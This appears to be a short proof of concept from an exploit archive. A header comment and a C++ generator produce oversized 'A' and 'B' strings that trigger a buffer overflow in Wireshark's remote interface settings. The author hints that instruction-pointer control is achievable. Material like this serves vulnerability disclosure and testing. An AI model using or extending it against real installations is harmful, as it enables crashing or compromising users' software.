/*

WireShark Buffer Overflow 0day 
author: X-h4ck,mem001@live.com,www.pirate.al
greetz to people that i love and my girlfriend , and yes imm
proud to be albanian.only the poc, no exploit available so i
wont confuse the script kiddies, eax,ecx,edx,ebx overwritten
s-kiddies u can easy get access over eip if u want to.
Tested on : Windows 7 ultimate
How to use: Capture>Options>Manage Interfaces>Remote Interfaces>Add===>
Host Input : 659 As
Port Input : 652 As, now lets stop with As and add 8 Bs for funn yeep?
Then Click "OK". In this way we can trigger the vulnerability.
ive tested this dummy attack in 1.8.2 & 1.6.0 , probabbly  all version 
may be fucked, huh ? if they possess the remote inteface function.

*/


#include <cstdio>
#include <iostream>
// wrote a little shit code to generate > nicely for u those strings
using namespace std;
int main(){

  char buff1[] = "\x41";
  char buff2[] = "\x42";
  FILE *txtfile;
  txtfile = fopen("c:\\exploit.txt", "w");
  fputs("Host Input:\n",txtfile);
  for(int i=0; i < 659; i++){
    fputs(buff1,txtfile);
    }
  fputs("\n",txtfile); 
  fputs("Port Input:\n",txtfile); 
  for (int y=0; y < 652; y++) {
    fputs(buff1,txtfile);
    }
  for(int x=0; x < 8; x++) {
    fputs(buff2,txtfile);
    }
  fclose(txtfile);
  return 0;
}
